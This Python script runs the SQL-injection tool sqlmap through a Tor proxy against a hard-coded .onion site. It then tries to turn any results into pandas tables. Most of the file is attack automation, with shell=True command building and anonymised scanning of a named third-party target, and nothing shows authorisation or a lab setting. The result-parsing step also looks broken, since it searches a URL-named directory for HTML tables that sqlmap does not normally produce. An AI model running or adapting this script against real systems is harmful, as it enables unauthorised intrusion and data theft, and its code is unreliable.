import subprocess
import os
from bs4 import BeautifulSoup
import pandas as pd
import glob

# set the target URL and output directory
url = 'http://ozgunsbxgra7huwedjymobzswzk3hdysncrfrhdv2kledvjaqydtzdyd.onion/'
output_path = './output'

# Set the Tor SOCKS proxy address
tor_proxy = "socks5://127.0.0.1:9050"

# Set the directory name
dirname = f'{output_path}/{url}'

# Use the os.makedirs() function to create the directory
os.makedirs(dirname, exist_ok=True)

# Check if the directory was created
if os.path.exists(dirname):
    print(f"Directory '{dirname}' created successfully!")
else:
    print(f"Failed to create directory '{dirname}'!")

# Run sqlmap with the Tor proxy and save output to the output directory
cmd = f"sqlmap -u {url} --tor --tor-type=SOCKS5 --tor-port=9050 --output-dir={output_path}"
subprocess.run(cmd, shell=True)

# Set the pattern to match
pattern = f'{dirname}/*.html'

# Find all the files that match the pattern
files = glob.glob(pattern)

for file in files:
    print(file)
    # Read the HTML file into a BeautifulSoup object
    with open(file) as f:
        soup = BeautifulSoup(f, 'html.parser')

    # Find the table element in the HTML file
    table = soup.find('table')

    if table:
        # Extract the column headers from the table
        headers = []
        for th in table.find_all('th'):
            headers.append(th.text.strip())

        # Extract the data rows from the table
        rows = []
        for tr in table.find_all('tr')[1:]:
            row = []
            for td in tr.find_all('td'):
                row.append(td.text.strip())
            if row and row[0] == '1':
                rows.append(row)

        if rows:
            # Convert the data to a Pandas DataFrame
            df = pd.DataFrame(rows, columns=headers)

            # Print the DataFrame
            print(df)
        else:
            print(f"No rows found in table in file {file}")
    else:
        print(f"No table found in file {file}")

